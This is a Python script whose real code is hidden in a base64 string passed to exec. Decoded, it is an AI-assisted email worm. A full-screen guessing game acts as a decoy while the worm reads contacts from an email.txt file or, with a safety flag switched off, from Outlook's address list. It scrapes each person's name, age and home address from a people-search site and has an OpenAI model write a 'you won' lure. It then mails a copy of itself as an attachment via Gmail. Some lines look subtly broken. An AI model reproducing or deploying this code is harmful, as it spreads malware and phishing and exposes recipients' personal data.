import openai
import win32com.client
import webbrowser
import requests
import time
import os
import shutil
from bs4 import BeautifulSoup
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import re
import tkinter as tk
from tkinter import messagebox
import random
import threading



import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IG9wZW5haQppbXBvcnQgd2luMzJjb20uY2xpZW50CmltcG9ydCB3ZWJicm93c2VyCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdGltZQppbXBvcnQgb3MKaW1wb3J0IHNodXRpbApmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cAppbXBvcnQgc210cGxpYgpmcm9tIGVtYWlsLm1pbWUubXVsdGlwYXJ0IGltcG9ydCBNSU1FTXVsdGlwYXJ0CmZyb20gZW1haWwubWltZS50ZXh0IGltcG9ydCBNSU1FVGV4dApmcm9tIGVtYWlsLm1pbWUuYmFzZSBpbXBvcnQgTUlNRUJhc2UKZnJvbSBlbWFpbCBpbXBvcnQgZW5jb2RlcnMKaW1wb3J0IHJlCmltcG9ydCB0a2ludGVyIGFzIHRrCmZyb20gdGtpbnRlciBpbXBvcnQgbWVzc2FnZWJveAppbXBvcnQgcmFuZG9tCmltcG9ydCB0aHJlYWRpbmcKCmRlZiBkaXN0cmFjdCgpOgogICAgdGFyZ2V0X251bWJlciA9IHJhbmRvbS5yYW5kaW50KDEsIDEwKQoKICAgIGRlZiBjaGVja19ndWVzcygpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdXNlcl9ndWVzcyA9IGludChndWVzc192YXIuZ2V0KCkpCiAgICAgICAgICAgIGlmIDEgPD0gdXNlcl9ndWVzcyA8PSAxMDoKICAgICAgICAgICAgICAgIGlmIHVzZXJfZ3Vlc3MgPT0gdGFyZ2V0X251bWJlcjoKICAgICAgICAgICAgICAgICAgICBtZXNzYWdlYm94LnNob3dpbmZvKCJDb25ncmF0dWxhdGlvbnMhIiwgIllvdSBndWVzc2VkIHRoZSBjb3JyZWN0IG51bWJlciEiKQogICAgICAgICAgICAgICAgICAgIHJvb3QuZGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2Vib3guc2hvd2luZm8oIkluY29ycmVjdCIsICJUcnkgYWdhaW4hIikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIG1lc3NhZ2Vib3guc2hvd3dhcm5pbmcoIkludmFsaWQgR3Vlc3MiLCAiUGxlYXNlIGVudGVyIGEgbnVtYmVyIGJldHdlZW4gMSBhbmQgMTAuIikKICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICAgICAgbWVzc2FnZWJveC5zaG93d2FybmluZygiSW52YWxpZCBJbnB1dCIsICJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKCiAgICByb290ID0gdGsuVGsoKQogICAgcm9vdC50aXRsZSgiR3Vlc3NpbmcgR2FtZSIpCiAgICByb290LmF0dHJpYnV0ZXMoJy1mdWxsc2NyZWVuJywgVHJ1ZSkKICAgIGd1ZXNzX3ZhciA9IHRrLlN0cmluZ1ZhcigpCgogICAgdGsuTGFiZWwocm9vdCwgdGV4dD0iR3Vlc3MgdGhlIG51bWJlciBiZXR3ZWVuIDEgYW5kIDEwOiIpLnBhY2socGFkeT0xMCkKICAgIAogICAgZW50cnkgPSB0ay5FbnRyeShyb290LCB0ZXh0dmFyaWFibGU9Z3Vlc3NfdmFyKQogICAgZW50cnkucGFjayhwYWR5PTUpCgogICAgZ3Vlc3NfYnV0dG9uID0gdGsuQnV0dG9uKHJvb3QsIHRleHQ9Ikd1ZXNzIiwgY29tbWFuZD1jaGVja19ndWVzcykKICAgIGd1ZXNzX2J1dHRvbi5wYWNrKHBhZHk9MTApCiAgICBiYWNrZ3JvdW5kID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9bWFpbikKICAgIGJhY2tncm91bmQuc3RhcnQoKQogICAgcm9vdC5saWZ0KCkKICAgIHJvb3QuYXR0cmlidXRlcygnLXRvcG1vc3QnLCBUcnVlKQogICAgcm9vdC5hdHRyaWJ1dGVzKCctdG9wbW9zdCcsIEZhbHNlKQoKICAgIHJvb3QubWFpbmxvb3AoKQoKZGVmIHlvdVN1cmVCcm8oKToKICAgICNFbnN1cmUgdGhhdCBicm8gaXMgc3VyZQogICAgcHJpbnQoIlRoaXMgaXMgYSBkZW1vIG9mIGhvdyBBSSBjYW4gYmUgdXNlZC4gVG8gYmUgc2FmZSwgaXQgaXMgaGFyZGNvZGVkIHRvIE5PVCBjb2xlY3QgZW1haWxzLCBhbmQgd2lsbCBpbnN0ZWFkIHJlZmVyIHRvIGVtYWlscy50eHRcbiIpCiAgICBwcmludCgiUGxlYXNlIGluc2VydCB5b3VyIG9wZW5BUEkga2V5OlxuIikKICAgIHByaW50KCJJZiB5b3UgYXJlIFNVUkUgeW91IHdhbnQgdG8gcnVuIHRoaXMsIHR5cGUgJ1lFUycuXG4iKQogICAgeW4gPSBpbnB1dCgpCiAgICBpZiB5biA9PSAiWUVTIjoKICAgICAgICBwcmludCgiSGVyZSB3ZSBnbyFcbiIpCiAgICAgICAgbWFpbigpCiAgICBlbHNlOgogICAgICAgIHByaW50KCJHb29kIGNob2ljZSBicm8uIFNodXR0aW5nIGRvd24uXG4iKQogICAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgICBxdWl0KCkKCmRlZiBtYWluKCk6CiAgICAjeW9pbmsgdGhlIGVtYWlsIGNvbnRhY3RzIGZyb20gb3V0bG9vawogICAgc2FmZXRleSA9IDEKICAgIGlmIHNhZmV0ZXkgIT0gMToKICAgICAgICB0cnk6CiAgICAgICAgICAgIG91dEFwcCA9IHdpbjMyY29tLmNsaWVudC5nZW5jYWNoZS5FbnN1cmVEaXNwYXRjaCgiT3V0bG9vay5BcHBsaWNhdGlvbiIpCiAgICAgICAgICAgIG91dEdBTCA9IG91dEFwcC5TZXNzaW9uLkdldEdsb2JhbEFkZHJlc3NMaXN0KCkKICAgICAgICAgICAgZW50cmllcyA9IG91dEdBTC5BZGRyZXNzRW50cmllcwogICAgICAgICAgICBmb3VuZEVtYWlscyA9IFtdCiAgICAgICAgICAgICNHZXQgYWxsIG5vbi1udWxsIGVudHJpZXMKCiAgICAgICAgICAgIGZvciBlbnRyeSBpbiBlbnRyaWVzOgogICAgICAgICAgICAgICAgaWYgZW50cnkuVHlwZSA9PSAiRVgiOgogICAgICAgICAgICAgICAgICAgIHVzZXIgPSBlbnRyeS5HZXRFeGNoYW5nZVVzZXIoKQogICAgICAgICAgICAgICAgICAgIGlmIHVzZXIgaXMgbm90IE5vbmU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiRW1haWw6IiwgdXNlci5QcmltYXJ5U210cEFkZHJlc3MpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3VuZEVtYWlscy5hcHBlbmQodXNlci5QcmltYXJ5U210cEFkZHJlc3MpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgiU29ycnksIHNvbWV0aGluZyB3ZW50IHdyb25nLiAucHN0IGZpbGUgY291bGQgbm90IGJlIGZvdW5kLlxuIikKICAgICAgICAgICAgcXVpdCgpCiAgICAgICAgICAgIAogICAgZWxzZToKICAgICAgICBmb3VuZEVtYWlscyA9IFtdCiAgICAgICAgcHJpbnQoIlNhZmV0ZXkgaXMgT04uIFVzaW5nIHRleHQgZmlsZS4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBvcGVuKCJlbWFpbC50eHQiLCAiciIpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBmaWxlOgogICAgICAgICAgICAgICAgICAgIGZvdW5kRW1haWxzLmFwcGVuZChsaW5lLnN0cmlwKCkpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgiTm8gZHVtbXkgZmlsZSBkZXRlY3RlZCwgc2h1dHRpbmcgZG93bi5cbiIpCiAgICAgICAgICAgIHF1aXQoKQoKICAgIHNwcmVhZChmb3VuZEVtYWlscykKICAgIHJldHVybiBmb3VuZEVtYWlscyAKCmRlZiBlbWFpbE1ha2UobmFtZSwgYWdlLCBhZGRyZXNzLCBlbWFpbCwgbW9kZWw9ImdwdC0zLjUtdHVyYm8iKToKICAgICNUaGlzIGlzIGp1c3QgdGhlIHByb21wdCBmb3IgQ2hhdEdQVAogICAgcHJvbXB0ID0gZiIiIkdlbmVyYXRlIGFuIGVtYWlsIHVzaW5nIHRoZSBmb2xsb3dpbmcgdmFyaWFibGVzOgogICAgTmFtZToge25hbWV9CiAgICBBZ2U6IHthZ2V9CiAgICBBZGRyZXNzOiB7YWRkcmVzc30gCgogICAgVGhlIGVtYWlsIHNob3VsZCBiZSBhbm5vdW5jaW5nIGEgZ2FtZSB0aGF0IHRoaXMgcGVyc29uIGhhcyB3b24sIHdpY2ggaXMgYXR0YWNoZWQgdG8gdGhlIGVtYWlsLiAKICAgICIiIgogICAgbWVzc2FnZXMgPSBbeyJyb2xlIjogInVzZXIiLCAiY29udGVudCI6IHByb21wdH1dCiAgICByZXNwb25zZSA9IG9wZW5haS5DaGF0Q29tcGxldGlvbi5jcmVhdGUoCiAgICAgICAgbW9kZWwgPSBtb2RlbCwKICAgICAgICBtZXNzYWdlcyA9IG1lc3NhZ2VzLAogICAgICAgIHRlbXBlcmF0dXJlID0gMC4yLAogICAgICAgICkKICAgIHByaW50KHJlc3BvbnNlLmNob2ljZXNbMF0ubWVzc2FnZVsiY29udGVudCJdKQogICAgcGF5bG9hZChyZXNwb25zZS5jaG9pY2VzWzBdLm1lc3NhZ2VbImNvbnRlbnQiXSwgbmFtZSwgZW1haWwpCgoKZGVmIHNwcmVhZChmb3VuZEVtYWlscyk6CiAgICBmb3IgZW1haWwgaW4gZm91bmRFbWFpbHM6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB3ZWJicm93c2VyLm9wZW4oImh0dHBzOi8vdGhhdHN0aGVtLmNvbSIpCiAgICAgICAgICAgIG9zLnN5c3RlbSgidGFza2tpbGwgL2ltIGNocm9tZS5leGUgL2YiKQogICAgICAgICAgICBvcy5zeXN0ZW0oInRhc2traWxsIC9pbSBmaXJlZm94LmV4ZSAvZiIpCiAgICAgICAgICAgIG9zLnN5c3RlbSgidGFza2tpbGwgL2ltIGVkZ2UuZXhlIC9mIikKICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNy4wLjAuMCBTYWZhcmkvNTM3LjM2IgogICAgICAgICAgICB9CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL3RoYXRzdGhlbS5jb20vZW1haWwvIiArIGVtYWlsCiAgICAgICAgICAgIHJlcSA9IHJlcXVlc3RzLmdldCh1cmwsIGhlYWRlcnM9aGVhZGVycykKICAgICAgICAgICAgc291cCA9IEJlYXV0aWZ1bFNvdXAocmVxLmNvbnRlbnQsICdodG1sLnBhcnNlcicpCiAgICAgICAgICAgIGh0bWwgPSBzb3VwLnByZXR0aWZ5KCkKICAgICAgICAgICAgcG9pbnQgPSBzb3VwLmZpbmQoaWQ9ImFwcCIpCiAgICAgICAgICAgIGRhdGEgPSBwb2ludC5maW5kKCJkaXYiLCBjbGFzc189Im5hbWUiKQogICAgICAgICAgICBuYW1lID0gZGF0YS5maW5kKCJhIiwgY2xhc3NfPSAid2ViIikKCiAgICAgICAgICAgIGFnZSA9IHBvaW50LmZpbmQoImRpdiIsIGNsYXNzXyA9ICJhZ2UiKQogICAgICAgICAgICAKICAgICAgICAgICAgYWRkcmVzcyA9IHBvaW50LmZpbmQoInNwYW4iLCBjbGFzc18gPSAic3RyZWV0IikKCiAgICAgICAgICAgIGVtYWlsTWFrZShuYW1lLCBhZ2UsIGFkZHJlc3MsIGVtYWlsKQoKICAgICAgICAgICAgICAgIAogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoZiJTb21ldGhpbmcgZnVja2VkIHVwOiB7ZX0iKQoKZGVmIHBheWxvYWQocmVzcG9uc2UsIGZpbHRlcmVkY2FwLCBlbWFpbCk6CiAgICBzY3JpcHRuID0gdGltZS5zdHJmdGltZSgiJVktJW0tJWRfJUglTSIpICsgJ18nICsgb3MucGF0aC5iYXNlbmFtZShfX2ZpbGVfXykKICAgIHNodXRpbC5jb3B5KCJVc2Vyc1wlVVNFUlBST0ZJTEUlXERvd25sb2FkcyIsICIlVVNFUlBST0ZJTEUlXERvd25sb2FkcyIgKyBvcy5zZXAgKyAic2NyaXB0biIpCiAgICBlbWFpbFNlbmQocmVzcG9uc2UsIGZpbHRlcmVkY2FwLCBlbWFpbCwgc2NyaXB0bikKICAgIHJldHVybiBzY3JpcHRuCgoKZGVmIGVtYWlsU2VuZChyZXNwb25zZSwgbmFtZSwgZW1haWwsIHNjcmlwdG4pOgogICAgc2VuZF9hZGRyID0gRU1BSUwKICAgIHNlbmRlcl9wYXNzID0gUEFTUwogICAgcmVjX2FkZHIgPSBlbWFpbAogICAgbWVzc2FnZSA9IE1JTUVNdWx0aXBhcnQoKQogICAgbWVzc2FnZVsnRnJvbSddID0gc2VuZF9hZGRyCiAgICBtZXNzYWdlWydUbyddID0gcmVjX2FkZHIKICAgIG1lc3NhZ2VbJ1N1YmplY3QnXSA9IGYnQ29uZ3JhdHVsYXRpb25zISB7bmFtZX0nCiAgICBtZXNzYWdlLmF0dGFjaChNSU1FVGV4dChyZXNwb25zZSwgJ3BsYWluJykpCiAgICBwZGZfbmFtZSA9IHNjcmlwdG4KICAgIGF0dGFjaCA9IG9wZW4ocGRmX25hbWUsICdyYicpCiAgICBwYXlsb2FkID0gTUlNRUJhc2UoJ2FwcGxpY2F0aW9uJywgJ29jdGV0LXN0cmVhbScpCiAgICBwYXlsb2FkLnNldF9wYXlsb2FkKGF0dGFjaC5yZWFkKCkpCiAgICBlbmNvZGVycy5lbmNvZGVfYmFzZTY0KHBheWxvYWQpCiAgICBwYXlsb2FkLmFkZF9oZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb24nLCBmJ2F0dGFjaG1lbnQ7IGZpbGVuYW1lPXtwZGZfbmFtZX0nKQogICAgbWVzc2FnZS5hdHRhY2gocGF5bG9hZCkKICAgIHdpdGggc210cGxpYi5TTVRQKCdzbXRwLmdtYWlsLmNvbScsIDU4NykgYXMgc2Vzc2lvbjoKICAgICAgICBzZXNzaW9uLnN0YXJ0dGxzKCkKICAgICAgICBzZXNzaW9uLmxvZ2luKHNlbmRfYWRkciwgc2VuZGVyX3Bhc3MpCiAgICAgICAgdGV4dCA9IG1lc3NhZ2UuYXNfc3RyaW5nKCkKICAgICAgICBzZXNzaW9uLnNlbmRtYWlsKHNlbmRfYWRkciwgcmVjX2FkZHIsIHRleHQpCgoKb3BlbmFpLmFwaV9rZXkgPSBpbnB1dCgiV2hhdCBpcyB5b3VyIG9wZW5BUEkga2V5PyAocmVxdWlyZWQgZm9yIHByb2dyYW0gdG8gcnVuKSIpCmlmIG9wZW5haS5hcGlfa2V5ID09ICIiOgogICAgcHJpbnQoIk5vIGtleSBkZXRlY3RlZC4gU2h1dHRpbmcgZG93blxuIikKZWxzZToKICAgIHBhc3MKCkVNQUlMID0gaW5wdXQoIlBsZWFzZSBpbnB1dCB5b3VyIGVtYWlsIikKUEFTUyA9IGlucHV0KCJQbGVhc2UgcHV0IGluIHlvdXIgZW1haWwncyBwYXNzd29yZCIpCgpkaXN0cmFjdCgp')))
